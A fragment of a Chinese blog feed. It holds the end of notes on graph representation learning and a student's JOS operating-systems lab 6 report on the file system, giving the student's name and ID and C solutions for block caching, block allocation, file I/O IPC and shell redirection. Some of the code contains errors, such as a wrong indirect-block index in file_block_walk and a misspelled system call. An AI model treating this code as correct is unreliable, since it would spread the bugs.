srcset="/img/loading.gif" alt="2.3-3"></p><p>此时，如果是较小的分区，那么分母就会是比较小的，进而ratio cut变大</p><p>同时还有一种解决方法——<code>Ncut</code>：</p><p><img src="/2021/03/03/Graph-Representation-learning/2.3-4.PNG" srcset="/img/loading.gif" alt="2.3-4"></p><p><strong>使用拉普拉斯谱最小化RatioCut</strong></p><p>目标是通过拉普拉斯谱来找到最小的ratiocut</p><blockquote><p>最小化目标定义为，<br><img src="/2021/03/03/Graph-Representation-learning/2.3-5.PNG" srcset="/img/loading.gif" alt="2.3-5"></p><p>为了解决NP难问题，将a的条件放宽到，满足上述2个条件的实值向量即可。<br>根据瑞利-里兹定理，这个优化问题的解是由L的第二小的特征值对应的特征向量，因此，我们可以通过设置a为第二小的特征向量，来逼近RatioCut的最小值。<br>总而言之，拉普拉斯矩阵的第二小的特征向量是离散向量的连续近似，它给出了一个最优的聚类分配。<br><img src="/2021/03/03/Graph-Representation-learning/2.3-6.PNG" srcset="/img/loading.gif" alt="2.3-6"></p></blockquote><h4 id="2-3-3-Generalized-spectral-clustering"><a href="#2-3-3-Generalized-spectral-clustering" class="headerlink" title="2.3.3 Generalized spectral clustering"></a>2.3.3 Generalized spectral clustering</h4><p>上一节，我们找到了一个将图分成两个簇的最优划分。那么，我们也可以将这种方法推广到K个簇的最优划分问题上。</p><p>这种一般方法的步骤如下：<br><img src="/2021/03/03/Graph-Representation-learning/2.3-8.PNG" srcset="/img/loading.gif" alt="2.3-8"></p><p>4、使用K均值聚类方法来聚合，从而在最优划分的条件下，将图划分成K簇。</p><h3 id="2-4-Towards-Learned-Representations"><a href="#2-4-Towards-Learned-Representations" class="headerlink" title="2.4 Towards Learned Representations"></a>2.4 Towards Learned Representations</h3><h1 id="Part-Ⅰ：Node-Embedding"><a href="#Part-Ⅰ：Node-Embedding" class="headerlink" title="Part Ⅰ：Node Embedding"></a>Part Ⅰ：Node Embedding</h1><h2 id="3-Neighborhood-Reconstruction-Methods"><a href="#3-Neighborhood-Reconstruction-Methods" class="headerlink" title="3.Neighborhood Reconstruction Methods"></a>3.Neighborhood Reconstruction Methods</h2><p>什么是node embedding and why we need？</p><p>有监督的机器学习都要经历以下几个步骤：首先在原始数据上进行特征工程（因为计算机无法直接识别一个抽象的东西，例如graph或者图片等，需要用计算机能够理解的方式表示出来），得到结构化的数据，接着确定机器学习算法，最终训练得到模型。在这个过程中，特征工程是十分耗时费力的。因此我们更喜欢能够自动获取这些特征的方式（如深度学习）。</p><p>而node embedding就是将计算机难以理解的raw data转变为可以理解的structure data，我们通过d维空间上的向量来表示一个节点，d是用来衡量节点信息的，d越大，往往代表节点所包含的信息越大，同时还要求embedding的过程是可逆的，即我们还能从所有向量中推测出原来的图的形式，同时为了评判这个过程的好坏，引入了衡量/相似函数similarity以及损失函数loss</p><p>下面是一个案例，将左边的图结构的节点用一个二维向量来表示（当然在实际项目中，embedding向量通常会有几十甚至几百个维度，这里采用二维向量只是为了方便可视化）。可以看到，在右边的图上，比较接近的点在网络中的关系也比较紧密。</p><p>但是，传统的深度学习框架很难解决Network Embedding，主要原因有以下几点：</p><p>CNN用于固定大小的图像/网格，即像素点的拓扑结构使单一的、固定的。</p><p>RNNs或word2vec用于文本/序列，即节点的次序是固定的。</p><p>而网络（Networks）的结构要复杂的多得多！网络拥有更加复杂的拓扑结构，且节点的顺序并不是固定的。更有甚者，网络是动态变化的。<br>因此，我们接下来讨论网络中的embedding nodes。</p><p>在第三章中，我们关心的是图的结构信息，所以忽略掉了所有的节点特征以及其他信息，同时我们的目标是在经过embedding之后，d维空间上两个向量的相似性和在图上两个节点的相似性基本上是很像的，在这里，我们首先要定义好什么是图上节点的相似性，之后才能构造编码函数并衡量向量空间上是否相似</p><p>第28页</p><p>假设左边就是一个我们需要输入的图结构，希望通过一个两层的神经网络来学习我们target node的一个新的表示，首先找到A的邻居B,C,D，之后再找的话就是找BCD的邻居，找到之后将相应的信息进行聚合，聚合之后会得到一层神经网络的结果，之后再次进行聚合，会得到A的经过两层神经网络的消息传递之后的结果</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;2-Background-amp-Traditional-approaches&quot;&gt;&lt;a href=&quot;#2-Background-amp-Traditional-approaches&quot; class=&quot;headerlink&quot; title=&quot;2.Background &amp;</summary>
      
    
    
    
    
    <category term="Graph representation learning" scheme="http://yoursite.com/tags/Graph-representation-learning/"/>
    
  </entry>
  
  <entry>
    <title>操作系统lab6实验报告</title>
    <link href="http://yoursite.com/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
    <id>http://yoursite.com/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</id>
    <published>2021-01-05T02:38:37.000Z</published>
    <updated>2021-01-05T04:42:41.764Z</updated>
    
    <content type="html"><![CDATA[<p align="right">姓名：贾昊龙</p><p align="right">学号：18307130049</p><h1 id="PartⅠ：运行结果"><a href="#PartⅠ：运行结果" class="headerlink" title="PartⅠ：运行结果"></a>PartⅠ：运行结果</h1><p><img src="/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/1.PNG" srcset="/img/loading.gif" alt="1"></p><h1 id="Part-Ⅱ：问题回答"><a href="#Part-Ⅱ：问题回答" class="headerlink" title="Part Ⅱ：问题回答"></a>Part Ⅱ：问题回答</h1><ul><li><strong>请回答Exercise 1后的Question 1，Do you have to do anything else to ensure that this I/O privilege setting is saved and restored properly when you subsequently switch from one environment to another? Why?</strong></li></ul><p>不需要，当进程陷入中断后，所有寄存器信息会被保存到进程的 env_tf 中，在之前的lab当中已经实现过了</p><ul><li><strong>详细描述JOS 中文件存储的结构、打开文件的过程以及往文件中写入数据的过程。</strong></li></ul><p>在JOS中，文件系统是一个运行在userspace的进程，而其他进程通过类似Clinet-Server的方式来与文件系统进程进行进程间通信，从而实现文件操作。</p><p>存储结构定义在<code>fs.h</code>当中</p><p><img src="/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/3.png" srcset="/img/loading.gif" alt="3"></p><p>而文件读写过程可以参考问题5的回答</p><ul><li><strong>对于此JOS，一个磁盘有多少个扇区？</strong></li></ul><p>JOS的磁盘总大小为定义在fs.h中的 DISKSIZE ,值为3GB；而每个扇区的大小为 SECTSIZE , 值为 512B。因此JOS总共有：3 * 2^21个扇区</p><ul><li><strong>请详细阐述，JOS中superblock的概念，以及superblock的布局和结构。</strong></li></ul><p>超级块指的是文件系统保存文件系统元数据的数据块</p><p>JOS中文件系统的第1块（块号为0）是磁盘块，用来用作保存bootloader和分区表，而第2块（块号为1）就是超级块，用来保存文件系统元信息的，布局如下：</p><p><img src="/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/4.PNG" srcset="/img/loading.gif" alt="4"></p><ul><li>以open文件为例，阐述regular环境访问磁盘的流程</li></ul><p>以磁盘读为例，当一个进程在发起一次磁盘读取请求的时候，首先会调用JOS提供的库函数 <code>read()</code>，而 <code>read()</code> 函数会调用 <code>devfile_read()</code> 函数，这个函数是进程端的磁盘读接口，它会继续将用户的读取请求递交给 <code>fsipc()</code> 函数，之后通过进程间通信IPC机制，将读取请求发送给接收端的文件系统进程。</p><p>文件系统进程<code>serve</code>会不断的进行 <code>ipc_recv()</code>来 检查是否有进程发起读写请求。在接收到进程读文件的 IPC信息后，serve会将这个信息发送给 <code>serve_read()</code> ，最后调用<code>file_read()</code> 函数完成真正的文件读取过程，而之前的过程都是在进行信息传递。</p><ul><li><strong>画出对应的流程图</strong></li></ul><p><img src="/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/7.PNG" srcset="/img/loading.gif" alt="7"></p><ul><li><strong>5-c fd page是什么时候设置好的？</strong></li></ul><p>fd page在JOS中的作用类似于文件描述符，它是OpenFile结构体中的一项，结构如下：</p><p><img src="/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/5.PNG" srcset="/img/loading.gif" alt="5"></p><p>当文件系统进程接收到文件读写请求时，会调用<code>server_open()</code>函数打开文件，并写入fd page信息。</p><p><img src="/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/6.PNG" srcset="/img/loading.gif" alt="6"></p><h1 id="Part-A：the-file-system"><a href="#Part-A：the-file-system" class="headerlink" title="Part A：the file system"></a>Part A：the file system</h1><h4 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise 1"></a>Exercise 1</h4><blockquote><p><code>i386_init</code> identifies the file system environment by passing the type <code>ENV_TYPE_FS</code> to your environment creation function, <code>env_create</code>. Modify <code>env_create</code> in <code>env.c</code>, so that it gives the file system environment I/O privilege, but never gives that privilege to any other environment.</p><p>Make sure you can start the file environment without causing a General Protection fault. You should pass the “fs i/o” test in make grade.</p></blockquote><p><strong><code>env_create()</code></strong></p><p>只需要在文件系统进程创建的时候给予访问文件的权限即可（设置eflags寄存器的IOPL标志位）</p><pre><code class="hljs c"><span class="hljs-keyword">void</span>env_create(<span class="hljs-keyword">uint8_t</span> *binary, <span class="hljs-keyword">enum</span> EnvType type)&#123;<span class="hljs-comment">// LAB 3: Your code here.</span><span class="hljs-comment">// If this is the file server (type == ENV_TYPE_FS) give it I/O privileges.</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">e</span>;</span><span class="hljs-keyword">int</span> r;<span class="hljs-keyword">if</span> ((r = env_alloc(&amp;e, <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>)) &#123;panic(<span class="hljs-string">"create env failed\n"</span>);&#125;<span class="hljs-comment">// LAB 5: Your code here.</span><span class="hljs-keyword">if</span> (type == ENV_TYPE_FS)&#123;e-&gt;env_tf.tf_eflags = e-&gt;env_tf.tf_eflags | FL_IOPL_MASK;&#125;load_icode(e, binary);e-&gt;env_type = type;&#125;</code></pre><h4 id="Exercise-2"><a href="#Exercise-2" class="headerlink" title="Exercise 2"></a>Exercise 2</h4><blockquote><p>IUse <code>free_block</code> as a model to implement <code>alloc_block</code> in <code>fs/fs.c</code>, which should find a free disk block in the bitmap, mark it used, and return the number of that block. When you allocate a block, you should immediately flush the changed bitmap block to disk with <code>flush_block</code>, to help file system consistency.</p><p>Use make grade to test your code. Your code should now pass “alloc_block”.mplement the <code>bc_pgfault</code> and <code>flush_block</code> functions in <code>fs/bc.c</code>. <code>bc_pgfault</code> is a page fault handler, just like the one your wrote in the previous lab for copy-on-write fork, except that its job is to load pages in from the disk in response to a page fault. When writing this, keep in mind that (1) <code>addr</code> may not be aligned to a block boundary and (2) <code>ide_read</code> operates in sectors, not blocks.</p><p>The <code>flush_block</code> function should write a block out to disk <em>if necessary</em>. <code>flush_block</code> shouldn’t do anything if the block isn’t even in the block cache (that is, the page isn’t mapped) or if it’s not dirty. We will use the VM hardware to keep track of whether a disk block has been modified since it was last read from or written to disk. To see whether a block needs writing, we can just look to see if the <code>PTE_D</code> “dirty” bit is set in the <code>uvpt</code> entry. (The <code>PTE_D</code> bit is set by the processor in response to a write to that page; see 5.2.4.3 in <a href="http://pdos.csail.mit.edu/6.828/2011/readings/i386/s05_02.htm" target="_blank" rel="noopener">chapter 5</a> of the 386 reference manual.) After writing the block to disk, <code>flush_block</code> should clear the <code>PTE_D</code> bit using <code>sys_page_map</code>.</p><p>Use make grade to test your code. Your code should pass “check_bc”, “check_super”, and “check_bitmap”</p></blockquote><p><strong><code>bc_pgfault</code></strong></p><p>该函数的作用是文件系统进程的缺页处理，将磁盘块数据读取到相应的内存位置</p><pre><code class="hljs c"><span class="hljs-comment">// LAB 5: you code here:</span>addr = (<span class="hljs-keyword">void</span> *)ROUNDDOWN(addr, BLKSIZE);<span class="hljs-keyword">if</span>((r = SYS_page_alloc(<span class="hljs-number">0</span>, addr, PTE_U | PTE_W | PTE_P)) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"in bc_pgfault, sys_page_alloc: %e"</span>, r);<span class="hljs-keyword">if</span> ((r = (ide_read(blockno*BLKSECTS, addr, BLKSECTS))) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"in bc_pgfault, sys_page_alloc: %e"</span>, r);<span class="hljs-comment">// Clear the dirty bit for the disk block page since we just read the</span><span class="hljs-comment">// block from disk</span></code></pre><p> <strong><code>flush_block</code></strong> </p><p>这个函数将缓存的block写回到磁盘中，如果数据块没有被写过，则不需要做任何事。通过 PTE_D 标志位可以判断数据块是否被写入过。</p><pre><code class="hljs c"><span class="hljs-keyword">void</span>flush_block(<span class="hljs-keyword">void</span> *addr)&#123;<span class="hljs-keyword">uint32_t</span> blockno = ((<span class="hljs-keyword">uint32_t</span>)addr - DISKMAP) / BLKSIZE;<span class="hljs-keyword">int</span> r;<span class="hljs-keyword">if</span> (addr &lt; (<span class="hljs-keyword">void</span>*)DISKMAP || addr &gt;= (<span class="hljs-keyword">void</span>*)(DISKMAP + DISKSIZE))panic(<span class="hljs-string">"flush_block of bad va %08x"</span>, addr);<span class="hljs-comment">// LAB 5: Your code here.</span><span class="hljs-comment">// panic("flush_block not implemented");</span>addr = (<span class="hljs-keyword">void</span>*)ROUNDDOWN(addr, BLKSIZE);<span class="hljs-keyword">if</span>(!va_is_mapped(addr) || !va_is_dirty(addr)) <span class="hljs-keyword">return</span>;<span class="hljs-keyword">if</span>((r = ide_write(blockno*BLKSECTS, addr, BLKSECTS)) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"in flush_block, ide_write: %e"</span>, r);<span class="hljs-keyword">if</span> ((r = sys_page_map(<span class="hljs-number">0</span>, addr, <span class="hljs-number">0</span>, addr, uvpt[PGNUM(addr)] &amp; PTE_SYSCALL)) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"in flush_block, sys_page_map: %e"</span>, r);&#125;</code></pre><h4 id="Exercise-3"><a href="#Exercise-3" class="headerlink" title="Exercise 3"></a>Exercise 3</h4><blockquote><p>Use <code>free_block</code> as a model to implement <code>alloc_block</code> in <code>fs/fs.c</code>, which should find a free disk block in the bitmap, mark it used, and return the number of that block. When you allocate a block, you should immediately flush the changed bitmap block to disk with <code>flush_block</code>, to help file system consistency.</p><p>Use make grade to test your code. Your code should now pass “alloc_block”.</p></blockquote><p><strong><code>alloc_block</code></strong></p><p>函数的作用是从 bitmap 中找到一个空的数据块，并给调用函数的进程分配它。</p><pre><code class="hljs c"><span class="hljs-keyword">int</span>alloc_block(<span class="hljs-keyword">void</span>)&#123;<span class="hljs-comment">// The bitmap consists of one or more blocks.  A single bitmap block</span><span class="hljs-comment">// contains the in-use bits for BLKBITSIZE blocks.  There are</span><span class="hljs-comment">// super-&gt;s_nblocks blocks in the disk altogether.</span><span class="hljs-comment">// LAB 5: Your code here.</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">uint32_t</span> i = <span class="hljs-number">2</span> ; i &lt; super-&gt;s_nblocks ; i++)&#123;<span class="hljs-keyword">if</span> (block_is_free(i))&#123;bitmap[i&gt;&gt;<span class="hljs-number">5</span>] &amp;= ~(<span class="hljs-number">1</span> &lt;&lt; (i % <span class="hljs-number">32</span>));flush_block(diskaddr(i));<span class="hljs-keyword">return</span> i;&#125;&#125;<span class="hljs-comment">// panic("alloc_block not implemented");</span><span class="hljs-keyword">return</span> -E_NO_DISK;&#125;</code></pre><h4 id="Exercise-4"><a href="#Exercise-4" class="headerlink" title="Exercise 4"></a>Exercise 4</h4><blockquote><p>Implement <code>file_block_walk</code> and <code>file_get_block</code>. <code>file_block_walk</code> maps from a block offset within a file to the pointer for that block in the <code>struct File</code> or the indirect block, very much like what <code>pgdir_walk</code> did for page tables. <code>file_get_block</code> goes one step further and maps to the actual disk block, allocating a new one if necessary.</p><p>Use make grade to test your code. Your code should pass “file_open”, “file_get_block”, and “file_flush/file_truncated/file rewrite”, and “testfile”.</p></blockquote><p><strong><code>file_block_walk</code></strong></p><p>这个函数的功能是找到文件 f 中第 filebno 号数据块的数据块号slot并保存到 ppdiskbno 中。</p><pre><code class="hljs c"><span class="hljs-comment">// Hint: Don't forget to clear any block you allocate.</span><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>file_block_walk(struct <span class="hljs-built_in">File</span> *f, <span class="hljs-keyword">uint32_t</span> filebno, <span class="hljs-keyword">uint32_t</span> **ppdiskbno, <span class="hljs-keyword">bool</span> alloc)&#123;    <span class="hljs-comment">// LAB 5: Your code here.</span><span class="hljs-keyword">if</span>(filebno&gt;= NDIRECT + NINDIRECT) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-keyword">if</span>(filebno&lt;NDIRECT)&#123;*ppdiskbno = &amp;(f-&gt;f_direct[filebno]);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (f-&gt;f_indirect == <span class="hljs-number">0</span>)&#123;<span class="hljs-keyword">if</span>(alloc) &#123;<span class="hljs-keyword">int</span> blockno = alloc_block();<span class="hljs-keyword">if</span>(blockno &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> -E_NO_DISK;<span class="hljs-built_in">memset</span>(diskaddr(blockno), <span class="hljs-number">0</span>, BLKSIZE);f-&gt;f_indirect = blockno;&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> -E_NOT_FOUND;&#125;<span class="hljs-keyword">uint32_t</span> * addr = (<span class="hljs-keyword">uint32_t</span>*)diskaddr(f-&gt;f_indirect);*ppdiskbno = &amp;addr[filebno];<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<span class="hljs-comment">// panic("file_block_walk not implemented");</span>&#125;</code></pre><p><strong><code>file_get_block</code></strong></p><p>这个函数的功能是查找文件 f 第 filebno 个数据块对应的虚拟地址 addr ，并将其保存到给定的地 址 blk 处。根据提示实现即可</p><pre><code class="hljs c"><span class="hljs-comment">// Hint: Use file_block_walk and alloc_block.</span><span class="hljs-keyword">int</span>file_get_block(struct <span class="hljs-built_in">File</span> *f, <span class="hljs-keyword">uint32_t</span> filebno, <span class="hljs-keyword">char</span> **blk)&#123;    <span class="hljs-comment">// LAB 5: Your code here.</span>    <span class="hljs-comment">// panic("file_get_block not implemented");</span><span class="hljs-keyword">uint32_t</span> *ppdiskbno;<span class="hljs-keyword">int</span> r = file_block_walk(f,filebno, &amp;ppdiskbno,<span class="hljs-number">1</span>);<span class="hljs-keyword">if</span>(r &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> r;<span class="hljs-keyword">if</span>((*ppdiskbno) == <span class="hljs-number">0</span>)&#123;<span class="hljs-keyword">if</span>((*ppdiskbno = alloc_block()) &lt; <span class="hljs-number">0</span>)&#123;<span class="hljs-keyword">return</span> -E_NO_DISK;&#125;&#125;*blk = diskaddr(*ppdiskbno);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h4 id="Exercise-5"><a href="#Exercise-5" class="headerlink" title="Exercise 5"></a>Exercise 5</h4><blockquote><p>Implement <code>serve_read</code> in <code>fs/serv.c</code>.</p><p><code>serve_read</code>‘s heavy lifting will be done by the already-implemented <code>file_read</code> in <code>fs/fs.c</code> (which, in turn, is just a bunch of calls to <code>file_get_block</code>). <code>serve_read</code> just has to provide the RPC interface for file reading. Look at the comments and code in <code>serve_set_size</code> to get a general idea of how the server functions should be structured.</p><p>Use make grade to test your code. Your code should pass “serve_open/file_stat/file_close” and “file_read” for a score of 70/150.</p></blockquote><p><strong><code>serve_read</code></strong></p><p>这个函数是文件系统进程的服务端接口，调用 <code>file_read()</code> 来实现真正的文件读取</p><pre><code class="hljs c"><span class="hljs-comment">// Read at most ipc-&gt;read.req_n bytes from the current seek position</span><span class="hljs-comment">// in ipc-&gt;read.req_fileid.  Return the bytes read from the file to</span><span class="hljs-comment">// the caller in ipc-&gt;readRet, then update the seek position.  Returns</span><span class="hljs-comment">// the number of bytes successfully read, or &lt; 0 on error.</span><span class="hljs-keyword">int</span>serve_read(<span class="hljs-keyword">envid_t</span> envid, <span class="hljs-keyword">union</span> Fsipc *ipc)&#123;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Fsreq_read</span> *<span class="hljs-title">req</span> = &amp;<span class="hljs-title">ipc</span>-&gt;<span class="hljs-title">read</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Fsret_read</span> *<span class="hljs-title">ret</span> = &amp;<span class="hljs-title">ipc</span>-&gt;<span class="hljs-title">readRet</span>;</span><span class="hljs-keyword">if</span> (debug)cprintf(<span class="hljs-string">"serve_read %08x %08x %08x\n"</span>, envid, req-&gt;req_fileid, req-&gt;req_n);<span class="hljs-comment">// Lab 5: Your code here:</span><span class="hljs-keyword">int</span> r;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">OpenFile</span> *<span class="hljs-title">o</span>;</span><span class="hljs-keyword">if</span> ((r = openfile_lookup(envid, req-&gt;req_fileid, &amp;o)) &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> r;r = file_read(o-&gt;o_file, ret-&gt;ret_buf, req-&gt;req_n, o-&gt;o_fd-&gt;fd_offset);<span class="hljs-keyword">if</span> (r &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> r;o-&gt;o_fd-&gt;fd_offset += r;<span class="hljs-keyword">return</span> r;&#125;</code></pre><h4 id="Exercise-6"><a href="#Exercise-6" class="headerlink" title="Exercise 6"></a>Exercise 6</h4><blockquote><p>Implement <code>serve_write</code> in <code>fs/serv.c</code> and <code>devfile_write</code> in <code>lib/file.c</code>.</p><p>Use make grade to test your code. Your code should pass “file_write”, “file_read after file_write”, “open”, and “large file” for a score of 90/150.</p></blockquote><p><strong><code>serve_write</code></strong></p><p>与之前的 serve_read() 实现方法基本一样</p><pre><code class="hljs c"><span class="hljs-comment">// Write req-&gt;req_n bytes from req-&gt;req_buf to req_fileid, starting at</span><span class="hljs-comment">// the current seek position, and update the seek position</span><span class="hljs-comment">// accordingly.  Extend the file if necessary.  Returns the number of</span><span class="hljs-comment">// bytes written, or &lt; 0 on error.</span><span class="hljs-keyword">int</span>serve_write(<span class="hljs-keyword">envid_t</span> envid, struct Fsreq_write *req)&#123;<span class="hljs-keyword">if</span> (debug)cprintf(<span class="hljs-string">"serve_write %08x %08x %08x\n"</span>, envid, req-&gt;req_fileid, req-&gt;req_n);<span class="hljs-comment">// LAB 5: Your code here.</span><span class="hljs-comment">// panic("serve_write not implemented");</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">OpenFile</span>* <span class="hljs-title">o</span> = <span class="hljs-title">NULL</span>;</span><span class="hljs-keyword">int</span> r = openfile_lookup(envid, req-&gt;req_fileid, &amp;o);<span class="hljs-keyword">if</span>(r &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> r;r = file_write(o-&gt;o_file, req-&gt;req_buf, req-&gt;req_n, o-&gt;o_fd-&gt;fd_offset);<span class="hljs-keyword">if</span>(r &gt; <span class="hljs-number">0</span>) o-&gt;o_fd-&gt;fd_offset += r;<span class="hljs-keyword">return</span> r;&#125;</code></pre><p><strong><code>devfile_write</code></strong></p><p>是客户端进程函数，通过调用 fsipc() 将传入的参数发送给文件系统进程。</p><pre><code class="hljs c"><span class="hljs-comment">// Write at most 'n' bytes from 'buf' to 'fd' at the current seek position.</span><span class="hljs-comment">//</span><span class="hljs-comment">// Returns:</span><span class="hljs-comment">// The number of bytes successfully written.</span><span class="hljs-comment">// &lt; 0 on error.</span><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span>devfile_write(struct Fd *fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> n)&#123;<span class="hljs-comment">// Make an FSREQ_WRITE request to the file system server.  Be</span><span class="hljs-comment">// careful: fsipcbuf.write.req_buf is only so large, but</span><span class="hljs-comment">// remember that write is always allowed to write *fewer*</span><span class="hljs-comment">// bytes than requested.</span><span class="hljs-comment">// LAB 5: Your code here</span><span class="hljs-comment">// panic("devfile_write not implemented");</span>fsipcbuf.<span class="hljs-built_in">write</span>.req_fileid = fd-&gt;fd_file.id;fsipcbuf.<span class="hljs-built_in">write</span>.req_n = MIN(n, PGSIZE);memmove(fsipcbuf.<span class="hljs-built_in">write</span>.req_buf, buf, fsipcbuf.<span class="hljs-built_in">write</span>.req_n);<span class="hljs-keyword">int</span> r = fsipc(FSREQ_WRITE, <span class="hljs-literal">NULL</span>);<span class="hljs-keyword">return</span> r;&#125;</code></pre><h1 id="Part-B：Spawning-Processes"><a href="#Part-B：Spawning-Processes" class="headerlink" title="Part B：Spawning Processes"></a>Part B：Spawning Processes</h1><h4 id="Exercise-7"><a href="#Exercise-7" class="headerlink" title="Exercise 7"></a>Exercise 7</h4><blockquote><p><code>spawn</code> relies on the new syscall <code>sys_env_set_trapframe</code> to initialize the state of the newly created environment. Implement <code>sys_env_set_trapframe</code> in <code>kern/syscall.c</code> (don’t forget to dispatch the new system call in <code>syscall()</code>).</p><p>Test your code by running the <code>user/spawnhello</code> program from <code>kern/init.c</code>, which will attempt to spawn <code>/hello</code> from the file system.</p><p>Use make grade to test your code.</p></blockquote><p><strong><code>sys_env_set_trapframe</code></strong></p><p>函数作用是将进程号为 envid 的进程的 TrapFrame 设为 tf ，并且在设置前需要检查 envid 是否存 在</p><pre><code class="hljs c"><span class="hljs-comment">// Set envid's trap frame to 'tf'.</span><span class="hljs-comment">// tf is modified to make sure that user environments always run at code</span><span class="hljs-comment">// protection level 3 (CPL 3), interrupts enabled, and IOPL of 0.</span><span class="hljs-comment">//</span><span class="hljs-comment">// Returns 0 on success, &lt; 0 on error.  Errors are:</span><span class="hljs-comment">//-E_BAD_ENV if environment envid doesn't currently exist,</span><span class="hljs-comment">//or the caller doesn't have permission to change envid.</span><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>sys_env_set_trapframe(<span class="hljs-keyword">envid_t</span> envid, struct Trapframe *tf)&#123;<span class="hljs-comment">// LAB 5: Your code here.</span><span class="hljs-comment">// Remember to check whether the user has supplied us with a good</span><span class="hljs-comment">// address!</span><span class="hljs-comment">// panic("sys_env_set_trapframe not implemented");</span><span class="hljs-keyword">int</span> r;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> * <span class="hljs-title">e</span>;</span><span class="hljs-keyword">if</span>((r=envid2env(envid, &amp;e, <span class="hljs-number">1</span>))&lt;<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> r;memmove(&amp;e-&gt;env_tf,tf,<span class="hljs-keyword">sizeof</span>(struct Trapframe));<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h1 id="Part-C：The-Shell"><a href="#Part-C：The-Shell" class="headerlink" title="Part C：The Shell"></a>Part C：The Shell</h1><h4 id="Exercise-10"><a href="#Exercise-10" class="headerlink" title="Exercise 10"></a>Exercise 10</h4><blockquote><p>The shell doesn’t support I/O redirection. It would be nice to run sh &lt;script instead of having to type in all the commands in the script by hand, as you did above. Add I/O redirection for &lt; to <code>user/sh.c</code>.</p><p>Test your implementation by typing sh &lt;script into your shell</p><p>Run make run-testshell to test your shell. <code>testshell</code> simply feeds the above commands (also found in <code>fs/testshell.sh</code>) into the shell and then checks that the output matches <code>fs/testshell.key</code>.</p></blockquote><p>修改<code>user/sh.c</code>中的<code>runcmd()</code>来支持重定向</p><pre><code class="hljs c"><span class="hljs-comment">// LAB 5: Your code here.</span><span class="hljs-comment">// panic("&lt; redirection not implemented");</span><span class="hljs-keyword">if</span> ((fd = <span class="hljs-built_in">open</span>(t, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;cprintf(<span class="hljs-string">"open %s for write: %e"</span>, t, fd);<span class="hljs-built_in">exit</span>();&#125;<span class="hljs-keyword">if</span> (fd != <span class="hljs-number">0</span>) &#123;dup(fd, <span class="hljs-number">0</span>);<span class="hljs-built_in">close</span>(fd);&#125;<span class="hljs-keyword">break</span>;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p align=&quot;right&quot;&gt;姓名：贾昊龙
&lt;/p&gt;&lt;p align=&quot;right&quot;&gt;学号：18307130049

&lt;/p&gt;&lt;h1 id=&quot;PartⅠ：运行结果&quot;&gt;&lt;a href=&quot;#PartⅠ：运行结果&quot; class=&quot;headerlink&quot; title=&quot;PartⅠ：运</summary>
      
    
    
    
    
    <category term="Operating System" scheme="http://yoursite.com/tags/Operating-System/"/>
    
  </entry>
  
  <entry>
    <title>VPN</title>
    <link href="http://yoursite.com/2020/12/22/VPN/"/>
    <id>http://yoursite.com/2020/12/22/VPN/</id>
    <published>2020-12-22T03:14:46.000Z</published>
    <updated>2021-01-04T11:38:20.026Z</updated>
    
